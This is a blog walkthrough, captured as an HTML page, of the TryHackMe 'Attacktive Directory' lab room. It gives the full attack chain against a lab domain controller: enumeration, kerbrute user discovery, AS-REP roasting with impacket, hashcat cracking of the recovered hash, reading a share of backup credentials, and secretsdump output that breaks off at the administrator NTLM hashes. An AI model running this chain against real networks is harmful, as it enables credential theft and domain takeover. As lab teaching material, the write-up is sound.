@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <meta name="generator" content="Hugo 0.92.2" />
+  <link rel="canonical" href="https://1d8.github.io/writeups/thm/attacktivedirectory/" />
+
+  
+    
+    <meta name="description" content="Description: Attacktive Directory Tryhackme Room Walkthrough
+Room link: https://tryhackme.com/room/attacktivedirectory
+Enumeration: Welcome To Attacktive Directory Performing an initial nmap scan on the target IP address:
+nmap -sV -sC -Pn &lt;INSERT IP ADDRESS&gt;
+We see various ports open! We also see a domain name which is spookysec.local. We can also run crackmapexec on the target to confirm this domain name:
+crackmapexec smb &lt;INSERT IP ADDRESS&gt;
+We now know that the TLD being used is .">
+  
+
+  <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://1d8.github.io/favicon-32x32.png"> 
+  <link rel="icon" type="image/png" sizes="16x16" href="https://1d8.github.io/favicon-16x16.png"> 
+  <link rel="manifest" href="https://1d8.github.io/site.webmanifest"> 
+  <link rel="mask-icon" href="https://1d8.github.io/safari-pinned-tab.svg" color="#000000"> 
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="theme-color" content="#ffffff">
+
+  <style>
+    body {
+      visibility: hidden;
+      opacity: 0;
+    }
+  </style>
+
+  <style id="darkTheme">
+    .intro-and-nav,
+    .main-and-footer {
+      filter: invert(100%);
+    }
+
+    * {
+      background-color: inherit
+    }
+
+    img:not([src*=".svg"]),
+    .colors,
+    iframe,
+    .demo-container {
+      filter: invert(100%);
+    }
+  </style>
+
+  <link rel="stylesheet" href="/css/prism.css" media="none" onload="this.media='all';">
+
+  
+  
+  <link rel="stylesheet" type="text/css" href="/css/styles.css">
+
+  
+    <link rel="stylesheet" href="/css/custom_01.css">
+  
+    <link rel="stylesheet" href="/css/custom_02.css">
+  
+
+  
+  
+  <title>Attacktive Directory Room Walkthroug/ | </title>
+</head>
+
+  <body>
+    <a href="#main">skip to content</a>
+    <noscript>
+  <style>
+    body {
+      visibility: visible;
+      opacity: 1;
+    }
+  </style>
+</noscript>
+
+    <svg style="display: none">
+  <symbol id="bookmark" viewBox="0 0 40 50">
+   <g transform="translate(2266 3206.2)">
+    <path style="stroke:currentColor;stroke-width:3.2637;fill:none" d="m-2262.2-3203.4-.2331 42.195 16.319-16.318 16.318 16.318.2331-42.428z"/>
+   </g>
+  </symbol>
+
+  <symbol id="w3c" viewBox="0 0 127.09899 67.763">
+   <text font-size="83" style="font-size:83px;font-family:Trebuchet;letter-spacing:-12;fill-opacity:0" letter-spacing="-12" y="67.609352" x="-26.782778">W3C</text>
+   <text font-size="83" style="font-size:83px;font-weight:bold;font-family:Trebuchet;fill-opacity:0" y="67.609352" x="153.21722" font-weight="bold">SVG</text>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m33.695.377 12.062 41.016 12.067-41.016h8.731l-19.968 67.386h-.831l-12.48-41.759-12.479 41.759h-.832l-19.965-67.386h8.736l12.061 41.016 8.154-27.618-3.993-13.397h8.737z"/>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m91.355 46.132c0 6.104-1.624 11.234-4.862 15.394-3.248 4.158-7.45 6.237-12.607 6.237-3.882 0-7.263-1.238-10.148-3.702-2.885-2.47-5.02-5.812-6.406-10.022l6.82-2.829c1.001 2.552 2.317 4.562 3.953 6.028 1.636 1.469 3.56 2.207 5.781 2.207 2.329 0 4.3-1.306 5.909-3.911 1.609-2.606 2.411-5.738 2.411-9.401 0-4.049-.861-7.179-2.582-9.399-1.995-2.604-5.129-3.912-9.397-3.912h-3.327v-3.991l11.646-20.133h-14.062l-3.911 6.655h-2.493v-14.976h32.441v4.075l-12.31 21.217c4.324 1.385 7.596 3.911 9.815 7.571 2.22 3.659 3.329 7.953 3.329 12.892z"/>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m125.21 0 1.414 8.6-5.008 9.583s-1.924-4.064-5.117-6.314c-2.693-1.899-4.447-2.309-7.186-1.746-3.527.73-7.516 4.938-9.258 10.13-2.084 6.21-2.104 9.218-2.178 11.978-.115 4.428.58 7.043.58 7.043s-3.04-5.626-3.011-13.866c.018-5.882.947-11.218 3.666-16.479 2.404-4.627 5.954-7.404 9.114-7.728 3.264-.343 5.848 1.229 7.841 2.938 2.089 1.788 4.213 5.698 4.213 5.698l4.94-9.837z"/>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m125.82 48.674s-2.208 3.957-3.589 5.48c-1.379 1.524-3.849 4.209-6.896 5.555-3.049 1.343-4.646 1.598-7.661 1.306-3.01-.29-5.807-2.032-6.786-2.764-.979-.722-3.486-2.864-4.897-4.854-1.42-2-3.634-5.995-3.634-5.995s1.233 4.001 2.007 5.699c.442.977 1.81 3.965 3.749 6.572 1.805 2.425 5.315 6.604 10.652 7.545 5.336.945 9.002-1.449 9.907-2.031.907-.578 2.819-2.178 4.032-3.475 1.264-1.351 2.459-3.079 3.116-4.108.487-.758 1.276-2.286 1.276-2.286l-1.276-6.644z"/>
+  </symbol>
+
+  <symbol id="tag" viewBox="0 0 177.16535 177.16535">
+    <g transform="translate(0 -875.2)">
+     <path style="fill-rule:evenodd;stroke-width:0;fill:currentColor" d="m159.9 894.3-68.79 8.5872-75.42 77.336 61.931 60.397 75.429-76.565 6.8495-69.755zm-31.412 31.835a10.813 10.813 0 0 1 1.8443 2.247 10.813 10.813 0 0 1 -3.5174 14.872l-.0445.0275a10.813 10.813 0 0 1 -14.86 -3.5714 10.813 10.813 0 0 1 3.5563 -14.863 10.813 10.813 0 0 1 13.022 1.2884z"/>
+    </g>
+  </symbol>
+
+  <symbol id="balloon" viewBox="0 0 141.73228 177.16535">
+   <g transform="translate(0 -875.2)">
+    <g>
+     <path style="fill:currentColor" d="m68.156 882.83-.88753 1.4269c-4.9564 7.9666-6.3764 17.321-5.6731 37.378.36584 10.437 1.1246 23.51 1.6874 29.062.38895 3.8372 3.8278 32.454 4.6105 38.459 4.6694-.24176 9.2946.2879 14.377 1.481 1.2359-3.2937 5.2496-13.088 8.886-21.623 6.249-14.668 8.4128-21.264 10.253-31.252 1.2464-6.7626 1.6341-12.156 1.4204-19.764-.36325-12.93-2.1234-19.487-6.9377-25.843-2.0833-2.7507-6.9865-7.6112-7.9127-7.8436-.79716-.20019-6.6946-1.0922-6.7755-1.0248-.02213.0182-5.0006-.41858-7.5248-.22808l-2.149-.22808h-3.3738z"/>
+     <path style="fill:currentColor" d="m61.915 883.28-3.2484.4497c-1.7863.24724-3.5182.53481-3.8494.63994-2.4751.33811-4.7267.86957-6.7777 1.5696-.28598 0-1.0254.20146-2.3695.58589-5.0418 1.4418-6.6374 2.2604-8.2567 4.2364-6.281 7.6657-11.457 18.43-12.932 26.891-1.4667 8.4111.71353 22.583 5.0764 32.996 3.8064 9.0852 13.569 25.149 22.801 37.517 1.3741 1.841 2.1708 2.9286 2.4712 3.5792 3.5437-1.1699 6.8496-1.9336 10.082-2.3263-1.3569-5.7831-4.6968-21.86-6.8361-33.002-.92884-4.8368-2.4692-14.322-3.2452-19.991-.68557-5.0083-.77707-6.9534-.74159-15.791.04316-10.803.41822-16.162 1.5026-21.503 1.4593-5.9026 3.3494-11.077 6.3247-15.852z"/>
+     <path style="fill:currentColor" d="m94.499 885.78c-.10214-.0109-.13691 0-.0907.0409.16033.13489 1.329 1.0675 2.5976 2.0723 6.7003 5.307 11.273 14.568 12.658 25.638.52519 4.1949.24765 14.361-.5059 18.523-2.4775 13.684-9.7807 32.345-20.944 53.519l-3.0559 5.7971c2.8082.76579 5.7915 1.727 8.9926 2.8441 11.562-11.691 18.349-19.678 24.129-28.394 7.8992-11.913 11.132-20.234 12.24-31.518.98442-10.02-1.5579-20.876-6.7799-28.959-.2758-.4269-.57803-.86856-.89617-1.3166-3.247-6.13-9.752-12.053-21.264-16.131-2.3687-.86369-6.3657-2.0433-7.0802-2.1166z"/>
+     <path style="fill:currentColor" d="m32.52 892.22c-.20090-.13016-1.4606.81389-3.9132 2.7457-11.486 9.0476-17.632 24.186-16.078 39.61.79699 7.9138 2.4066 13.505 5.9184 20.562 5.8577 11.77 14.749 23.219 30.087 38.74.05838.059.12188.1244.18052.1838 1.3166-.5556 2.5965-1.0618 3.8429-1.5199-.66408-.32448-1.4608-1.3297-3.8116-4.4602-5.0951-6.785-8.7512-11.962-13.051-18.486-5.1379-7.7948-5.0097-7.5894-8.0586-13.054-6.2097-11.13-8.2674-17.725-8.6014-27.563-.21552-6.3494.13041-9.2733 1.775-14.987 2.1832-7.5849 3.9273-10.986 9.2693-18.07 1.7839-2.3656 2.6418-3.57 2.4409-3.7003z"/>
+     <path style="fill:currentColor" d="m69.133 992.37c-6.2405.0309-12.635.76718-19.554 2.5706 4.6956 4.7759 9.935 10.258 12.05 12.625l4.1272 4.6202h11.493l3.964-4.4516c2.0962-2.3541 7.4804-7.9845 12.201-12.768-8.378-1.4975-16.207-2.6353-24.281-2.5955z"/>
+     <rect style="stroke-width:0;fill:currentColor" ry="2.0328" height="27.746" width="22.766" y="1017.7" x="60.201"/>
+    </g>
+   </g>
+  </symbol>
+
+  <symbol id="info" viewBox="0 0 41.667 41.667">
+   <g transform="translate(-37.035 -1004.6)">
+    <path style="stroke-linejoin:round;stroke:currentColor;stroke-linecap:round;stroke-width:3.728;fill:none" d="m76.25 1030.2a18.968 18.968 0 0 1 -23.037 13.709 18.968 18.968 0 0 1 -13.738 -23.019 18.968 18.968 0 0 1 23.001 -13.768 18.968 18.968 0 0 1 13.798 22.984"/>
+    <g transform="matrix(1.1146 0 0 1.1146 -26.276 -124.92)">
+     <path style="stroke:currentColor;stroke-linecap:round;stroke-width:3.728;fill:none" d="m75.491 1039.5v-8.7472"/>
+     <path style="stroke-width:0;fill:currentColor" transform="scale(-1)" d="m-73.193-1024.5a2.3719 2.3719 0 0 1 -2.8807 1.7142 2.3719 2.3719 0 0 1 -1.718 -2.8785 2.3719 2.3719 0 0 1 2.8763 -1.7217 2.3719 2.3719 0 0 1 1.7254 2.8741"/>
+    </g>
+   </g>
+  </symbol>
+
+  <symbol id="warning" viewBox="0 0 48.430474 41.646302">
+    <g transform="translate(-1.1273 -1010.2)">
+     <path style="stroke-linejoin:round;stroke:currentColor;stroke-linecap:round;stroke-width:4.151;fill:none" d="m25.343 1012.3-22.14 37.496h44.28z"/>
+     <path style="stroke:currentColor;stroke-linecap:round;stroke-width:4.1512;fill:none" d="m25.54 1027.7v8.7472"/>
+     <path style="stroke-width:0;fill:currentColor" d="m27.839 1042.8a2.3719 2.3719 0 0 1 -2.8807 1.7143 2.3719 2.3719 0 0 1 -1.718 -2.8785 2.3719 2.3719 0 0 1 2.8763 -1.7217 2.3719 2.3719 0 0 1 1.7254 2.8741"/>
+    </g>
+  </symbol>
+
+  <symbol id="menu" viewBox="0 0 50 50">
+     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="0" x="0"/>
+     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="20" x="0"/>
+     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="40" x="0"/>
+   </symbol>
+
+   <symbol id="link" viewBox="0 0 50 50">
+    <g transform="translate(0 -1002.4)">
+     <g transform="matrix(.095670 0 0 .095670 2.3233 1004.9)">
+      <g>
+       <path style="stroke-width:0;fill:currentColor" d="m452.84 192.9-128.65 128.65c-35.535 35.54-93.108 35.54-128.65 0l-42.881-42.886 42.881-42.876 42.884 42.876c11.845 11.822 31.064 11.846 42.886 0l128.64-128.64c11.816-11.831 11.816-31.066 0-42.9l-42.881-42.881c-11.822-11.814-31.064-11.814-42.887 0l-45.928 45.936c-21.292-12.531-45.491-17.905-69.449-16.291l72.501-72.526c35.535-35.521 93.136-35.521 128.64 0l42.886 42.881c35.535 35.523 35.535 93.141-.001 128.66zm-254.28 168.51-45.903 45.9c-11.845 11.846-31.064 11.817-42.881 0l-42.884-42.881c-11.845-11.821-11.845-31.041 0-42.886l128.65-128.65c11.819-11.814 31.069-11.814 42.884 0l42.886 42.886 42.876-42.886-42.876-42.881c-35.54-35.521-93.113-35.521-128.65 0l-128.65 128.64c-35.538 35.545-35.538 93.146 0 128.65l42.883 42.882c35.51 35.54 93.11 35.54 128.65 0l72.496-72.499c-23.956 1.597-48.092-3.784-69.474-16.283z"/>
+      </g>
+     </g>
+    </g>
+  </symbol>
+
+  <symbol id="doc" viewBox="0 0 35 45">
+   <g transform="translate(-147.53 -539.83)">
+    <path style="stroke:currentColor;stroke-width:2.4501;fill:none" d="m149.38 542.67v39.194h31.354v-39.194z"/>
+    <g style="stroke-width:25" transform="matrix(.098003 0 0 .098003 133.69 525.96)">
+     <path d="m220 252.36h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
+     <path style="stroke:currentColor;stroke-width:25;fill:none" d="m220 409.95h200"/>
+     <path d="m220 488.74h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
+     <path d="m220 331.15h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
+    </g>
+   </g>
+ </symbol>
+
+ <symbol id="tick" viewBox="0 0 177.16535 177.16535">
+  <g transform="translate(0 -875.2)">
+   <rect style="stroke-width:0;fill:currentColor" transform="rotate(30)" height="155" width="40" y="702.99" x="556.82"/>
+   <rect style="stroke-width:0;fill:currentColor" transform="rotate(30)" height="40" width="90.404" y="817.99" x="506.42"/>
+  </g>
+ </symbol>
+</svg>
+
+    <div class="wrapper">
+      <header class="intro-and-nav" role="banner">
+  <div>
+    <div class="intro">
+      <a
+        class="logo"
+        href="https://1d8.github.io/"
+        aria-label=" home page"
+      >
+        
+          <img 
+            src="/images/logo.svg" 
+            alt="Logo No Loado"
+          >
+        
+      </a>
+      <p class="library-desc">
+         The blog of a curious cybersecurity collegiate 
+      </p>
+    </div>
+    <nav id="patterns-nav" class="patterns" role="navigation">
+  <h2 class="vh">Main navigation</h2>
+  <button id="menu-button" aria-expanded="false">
+    <svg viewBox="0 0 50 50" aria-hidden="true" focusable="false">
+      <use href="#menu"></use>
+    </svg>
+    Menu
+  </button>
+  
+  <ul id="patterns-list">
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/cheatsheets/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">Cheatsheets</span>
+      </a>
+    </li>
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/cves/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">CVEs</span>
+      </a>
+    </li>
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/publications/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">Publications</span>
+      </a>
+    </li>
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/writeups/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">Writeups/Walkthroughs</span>
+      </a>
+    </li>
+  
+  </ul>
+</nav>
+    
+  </div>
+</header>
+
+      <div class="main-and-footer">
+        <div>
+          
+  <main id="main">
+    <h1>Attacktive Directory Room Walkthroug/</h1>
+    <p><strong>Description: Attacktive Directory Tryhackme Room Walkthrough</strong></p>
+<p>Room link: <a href="https://tryhackme.com/room/attacktivedirectory">https://tryhackme.com/room/attacktivedirectory</a></p>
+<h1 id="enumeration-welcome-to-attacktive-directory">Enumeration: Welcome To Attacktive Directory</h1>
+<p>Performing an initial <code>nmap</code> scan on the target IP address:</p>
+<p><code>nmap -sV -sC -Pn &lt;INSERT IP ADDRESS&gt;</code></p>
+<p><img src="https://i.imgur.com/QAbD4GA.png" alt=""></p>
+<p>We see various ports open! We also see a domain name which is <code>spookysec.local</code>. We can also run <code>crackmapexec</code> on the target to confirm this domain name:</p>
+<p><code>crackmapexec smb &lt;INSERT IP ADDRESS&gt;</code></p>
+<p><img src="https://i.imgur.com/wA439ok.png" alt=""></p>
+<p>We now know that the TLD being used is <code>.local</code>!</p>
+<p>Viewing the questions, we see that it&rsquo;s asking us what tool we can use to enumerate ports <code>139/445</code>. We can use <code>enum4linux</code> for this:</p>
+<p><code>enum4linux &lt;INSERT IP ADDRESS&gt;</code></p>
+<pre><code class="language-bash">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Oct 14 05:12:39 2023
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.101.197
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup/Domain on 10.10.101.197 )===========================
+
+
+[E] Can't find workgroup/domain
+
+
+
+ ===============================( Nbtstat Information for 10.10.101.197 )===============================
+
+Looking up status of 10.10.101.197
+No reply from 10.10.101.197
+
+ ===================================( Session Check on 10.10.101.197 )===================================
+
+
+[+] Server 10.10.101.197 allows sessions using username '', password ''
+
+
+ ================================( Getting domain SID for 10.10.101.197 )================================
+
+Domain Name: THM-AD
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ==================================( OS information on 10.10.101.197 )==================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 10.10.101.197 from srvinfo: 
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ =======================================( Users on 10.10.101.197 )=======================================
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                        
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                         
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+ =================================( Share Enumeration on 10.10.101.197 )=================================
+                                                                                                                                                                                                            
+do_connect: Connection to 10.10.101.197 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                    
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.101.197                                                                                                                                                               
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+ ===========================( Password Policy Information for 10.10.101.197 )===========================
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[E] Unexpected error from polenum:                                                                                                                                                                          
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+
+[+] Attaching to 10.10.101.197 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:10.10.101.197)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+
+[E] Failed to get password policy with rpcclient                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+
+ ======================================( Groups on 10.10.101.197 )======================================
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[+] Getting builtin groups:                                                                                                                                                                                 
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[+]  Getting builtin group memberships:                                                                                                                                                                     
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[+]  Getting local groups:                                                                                                                                                                                  
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[+]  Getting local group memberships:                                                                                                                                                                       
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[+]  Getting domain groups:                                                                                                                                                                                 
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[+]  Getting domain group memberships:                                                                                                                                                                      
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+ ==================( Users on 10.10.101.197 via RID cycling (RIDS: 500-550,1000-1050) )==================
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+[I] Found new SID:                                                                                                                                                                                          
+S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                    
+
+[I] Found new SID:                                                                                                                                                                                          
+S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                    
+
+[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                                                 
+                                                                                                                                                                                                            
+S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                                                              
+S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
+S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
+S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
+S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
+
+[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                                                
+                                                                                                                                                                                                            
+S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                                                    
+S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
+
+ ===============================( Getting printer info for 10.10.101.197 )===============================
+                                                                                                                                                                                                            
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                     
+
+
+enum4linux complete on Sat Oct 14 05:21:36 2023
+</code></pre>
+<p>We find that the domain name is <code>THM-AD</code></p>
+<h1 id="enumeration-enumerating-users-via-kerberos">Enumeration: Enumerating Users via Kerberos</h1>
+<p>We&rsquo;ll be using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> in order to help enumerate users which helps us brute force valid AD users via Kerberos Pre-Authentication.</p>
+<p>We&rsquo;ll be using the <code>userenum</code> command/module from this tool</p>
+<ul>
+<li>How this works is it sends a <em>Ticket Granting Ticket (TGT)</em> request with no pre-authentiation to the <em>Key Distribution Center (KDC)</em> of the AD network. If the KDC responds with a <em>PRINCIPAL UNKNOWN</em>, then this indicates to us that the username doesn&rsquo;t exist. But if the KDC asks for pre-authentication, we know the username exists.</li>
+<li>According to the Github page, the <code>userenum</code> module doesn&rsquo;t cause any login failures which means we don&rsquo;t run the risk of locking out any user accounts.</li>
+</ul>
+<p>We can use <code>kerbrute</code> by running:</p>
+<p><code>kerbrute userenum -d spookysec.local --dc &lt;INSERT IP ADDRESS&gt; userlist.txt -t10</code></p>
+<ul>
+<li>The <code>userlist.txt</code> file can be downloaded from <a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt">here</a></li>
+</ul>
+<p><img src="https://i.imgur.com/mwz6uKu.png" alt=""></p>
+<p>The most interesting account I found was <code>svc-admin</code> which indicates it a service admin account! There&rsquo;s also a <code>backup</code> account which is interesting!</p>
+<h1 id="exploitation-abusing-kerberos">Exploitation: Abusing Kerberos</h1>
+<p>Now that we&rsquo;ve enumerated some valid usernames within the AD environment, we can now attempt to request TGTs from those valid usernames without providing the password. This is known as <strong>ASREPRoasting</strong> which occurs when an account has the <strong>Does not require pre-authentication</strong> config set. We can abuse this since we don&rsquo;t need to provide a password when requesting a TGT from a user account.</p>
+<p>All we need to know is the username, domain it belongs to, and the domain controller IP, all of which we already have!</p>
+<p>We can attempt to perform <strong>ASREPRoasting</strong> by using <strong>Get-NPUsers</strong> from the <a href="https://github.com/fortra/impacket">Impacket library</a>:</p>
+<p><code>impacket-GetNPUsers spookysec.local\svc-admin -dc-ip &lt;INSERT IP ADDRESS&gt; -no-pass</code></p>
+<p>This will give us a TGT in a file format that we can then use Hashcat to crack:</p>
+<p>By default, <code>GetNPUsers</code> will output the TGT within a hashcat compatible format which has the string <code>asrep</code> within it. If we look at the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat wiki</a>, it says that this hash type is <strong>Kerberos 5, etype 23, AS-REP</strong> which is of mode <strong>18200</strong>:</p>
+<pre><code class="language-bash">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:eadff12593f17a04b6f89c921ff6506e$8c5d81b69052c73d471d8a5d7e76cc1bc195dbb6c13c7b8d4e4e4175f023037fa7406a0f124e46144a4705491acc6d896ed2ee9ab65b86ef5264cb9ec6fbedbac9dda26df85698cf5caba00d126f31e66b8b1d5d468922b3658af7f5eb505fd9d314110597128b8746676adea63e62652ea1ac3dc777e6cd22afe740971f65bb1a3f20205845239fda9c71e90f5e8d838c26a8164023d45f58625b9eca53048695be9ea16e0788d0974f894c30199fb851a37c7ab7e7b540afa3a214f95cbd9dfb384c6049e6843e49a04eace680a8dcee89dbdc189707f616e7485fbe541955e057ef43a16b1ea8d4d827649278ead60e3e
+</code></pre>
+<p>We can then use the <a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt">provided password list</a> as our wordlist and specify the hash format and our hash file to begin cracking:</p>
+<p><code>hashcat -m18200 tgt.txt passwordlist.txt</code></p>
+<pre><code class="language-bash">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:eadff12593f17a04b6f89c921ff6506e$8c5d81b69052c73d471d8a5d7e76cc1bc195dbb6c13c7b8d4e4e4175f023037fa7406a0f124e46144a4705491acc6d896ed2ee9ab65b86ef5264cb9ec6fbedbac9dda26df85698cf5caba00d126f31e66b8b1d5d468922b3658af7f5eb505fd9d314110597128b8746676adea63e62652ea1ac3dc777e6cd22afe740971f65bb1a3f20205845239fda9c71e90f5e8d838c26a8164023d45f58625b9eca53048695be9ea16e0788d0974f894c30199fb851a37c7ab7e7b540afa3a214f95cbd9dfb384c6049e6843e49a04eace680a8dcee89dbdc189707f616e7485fbe541955e057ef43a16b1ea8d4d827649278ead60e3e:management2005
+</code></pre>
+<p>And we&rsquo;ve cracked the hash: <code>management2005</code>!</p>
+<h1 id="enumeration-back-to-basics">Enumeration: Back to Basics</h1>
+<p>Now that we have the password, we can enumerate the shares that the <code>svc-admin</code> user has access to:</p>
+<p><code>smbclient -L &lt;INSERT IP ADDRESS&gt; -U svc-admin</code></p>
+<p><img src="https://i.imgur.com/Un7wvhk.png" alt=""></p>
+<p>We see 6 shares, the most interesting being <code>backup</code>! We can login and view the contents of this share via: <code>smbclient \\\\&lt;INSERT IP ADDRESS&gt;\\backup -U svc-admin</code>:</p>
+<p><img src="https://i.imgur.com/h4UHfCc.png" alt=""></p>
+<p>We can download this file by running <code>mget backup_credentials</code>.</p>
+<p>Reading the contents of this file, we see it&rsquo;s base64 encoded string:</p>
+<p><img src="https://i.imgur.com/YY5O1Rn.png" alt=""></p>
+<p>We now have the credentials for the <code>backup</code> account!</p>
+<h1 id="domain-privilege-escalation-elevating-privileges-within-the-domain">Domain Privilege Escalation: Elevating Privileges within the Domain</h1>
+<p>Since we have the <code>backup</code> account credentials, we now have unique permissions since it&rsquo;s the backup account for the Domain Controller (DC)! This account allows all AD changes to be synced with it, including <em>password hashes</em>!</p>
+<p>So basically we&rsquo;re able to access <em>password hashes</em> from the DC using the <code>backup</code> account credentials! We can do so using <code>secretsdump.py</code> which is another tool from the  <a href="https://github.com/fortra/impacket">Impacket library</a>:</p>
+<p><code>impacket-secretsdump spookysec.local/backup:backup2517860@&lt;INSERT IP ADDRESS&gt;</code></p>
+<pre><code class="language-bash">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
